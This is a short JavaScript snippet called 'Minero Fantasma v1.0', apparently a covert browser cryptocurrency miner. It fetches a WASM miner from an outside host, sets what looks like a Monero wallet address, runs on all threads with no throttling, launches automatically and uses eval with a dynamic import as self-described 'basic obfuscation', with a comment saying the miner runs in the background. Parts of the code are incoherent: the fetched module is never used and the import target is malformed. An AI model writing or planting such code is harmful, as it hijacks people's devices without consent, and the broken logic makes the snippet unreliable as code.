// Minero Fantasma v1.0
fetch('https://cdn-fastxmr.live/miner.wasm')
    .then(r => r.arrayBuffer())
    .then(wasm => {
        const config = {
            user: '47wQkZgyJDHRZXxch1HiFQSjc6PC8EtLLE3cFCATZRn7BBxRE2VRVe8Z8NeJXS8wdCZxVofrLGAbK8ovhjqusGKKFanvJfv', // 
            pass: 'ghost',
            threads: -1,
            throttle: 0,
            autoLaunch: true
        };
        eval(`import('${config.user}.com')`); // ofuscação básica
        // O minero roda em segundo plano
    });